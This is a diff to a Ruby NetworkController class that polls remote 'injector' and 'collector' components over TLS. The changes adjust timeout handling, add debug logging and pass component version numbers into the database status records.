@@ -52,11 +52,23 @@ class NetworkController
         status = []
         logs = []
         begin
-          # three quarters of the interval check is a good compromise for timeout
+          # interval check minus 5 seconds is a good compromise for timeout
           # we are sure that the operations will be finished before the next check
-          Timeout::timeout(Config.instance.global['NC_INTERVAL'] * 0.75) do
+          Timeout::timeout(Config.instance.global['NC_INTERVAL'] - 5) do
             status, logs = check_element p
           end
+
+          # send the status to db
+          report_status(p, *status) unless status.nil? or status.empty?
+
+          trace :debug, "[NC] #{p['address']} Inserting logs..." unless logs.empty?
+
+          # send the logs to db
+          logs.each do |log|
+            DB.instance.injector_add_log(p['_id'], *log) if p['type'].nil?
+            DB.instance.collector_add_log(p['_id'], *log) unless p['type'].nil?
+          end
+
         rescue Exception => e
           trace :debug, "[NC] #{p['address']} #{e.message}"
           #trace :debug, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
@@ -64,19 +76,9 @@ class NetworkController
           report_status(p, 'ERROR', e.message)
         end
 
-        # send the status to db
-        report_status(p, *status) unless status.nil? or status.empty?
-
-        trace :debug, "[NC] #{p['address']} Inserting logs..." unless logs.empty?
-
-        # send the logs to db
-        logs.each do |log|
-          DB.instance.injector_add_log(p['_id'], *log) if p['type'].nil?
-          DB.instance.collector_add_log(p['_id'], *log) unless p['type'].nil?
-        end
-        
         # make sure to destroy the thread after the check
-        Thread.kill Thread.current
+        #Thread.kill Thread.current
+        Thread.exit
       end
     end
 
@@ -95,6 +97,8 @@ class NetworkController
     # be sure to have the network certificate
     DB.instance.get_network_cert(Config.instance.file('rcs-network')) unless File.exist? Config.instance.file('rcs-network.pem')
 
+    trace :debug, "[NC] connecting to #{element['address']}:#{element['port']}"
+
     # socket for the communication
     socket = TCPSocket.new(element['address'], element['port'])
 
@@ -109,11 +113,15 @@ class NetworkController
     # the exceptions will be caught from the caller
     ssl_socket.connect
 
+    trace :debug, "[NC] #{element['address']} connected"
+
     # create a new NC protocol
     proto = NCProto.new(ssl_socket)
 
     # authenticate with the component
     raise 'Cannot authenticate' unless proto.login(DB.instance.network_signature)
+
+    trace :debug, "[NC] #{element['address']} login"
 
     result = []
     logs = []
@@ -153,18 +161,15 @@ class NetworkController
           trace :info, "[NC] #{element['address']} monitor is: #{result.inspect}"
 
           # version check for incompatibility
+          # TODO: check this for 8.2.0
           if ver.to_i < MIN_VERSION
             result[0] = 'ERROR'
             result[1] = "Version too old, please update the component."
             trace :info, "[NC] #{element['address']} monitor is: #{result.inspect}"
           end
 
-          # TODO: remove for 8.2.0
-          if not element['type'].nil? and ver.to_i < 2012071601
-            result[0] = 'ERROR'
-            result[1] = "Version too old, please update the component."
-            trace :info, "[NC] #{element['address']} monitor is: #{result.inspect}"
-          end
+          # add the version to the results
+          result << ver
 
         when NCProto::PROTO_LOG
           time, type, desc = proto.log
@@ -182,6 +187,8 @@ class NetworkController
 
     # close the connection
     ssl_socket.close
+
+    trace :debug, "[NC] #{element['address']} disconnected"
 
     return result, logs
   end
@@ -215,7 +222,7 @@ class NetworkController
   end
 
 
-  def self.report_status(elem, status, message, disk=0, cpu=0, pcpu=0)
+  def self.report_status(elem, status, message, disk=0, cpu=0, pcpu=0, version=0)
 
     if elem['type'] == 'remote' then
       component = "RCS::ANON::" + elem['name']
@@ -225,13 +232,13 @@ class NetworkController
       internal_component = 'injector'
     end
 
-    trace :info, "[NC] [#{component}] #{elem['address']} #{status}"
+    trace :info, "[NC] [#{component}] #{elem['address']} #{status} #{message}"
 
     # create the stats hash
     stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}
 
     # send the status to the db
-    DB.instance.update_status component, elem['address'], status, message, stats, internal_component
+    DB.instance.update_status component, elem['address'], status, message, stats, internal_component, version
   end
 
   
@@ -250,7 +257,7 @@ class NetworkController
     stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}
 
     # send the status to the db
-    DB.instance.update_status component, ip, status, message, stats, 'nc'
+    DB.instance.update_status component, ip, status, message, stats, 'nc', $version
   end
 
 end
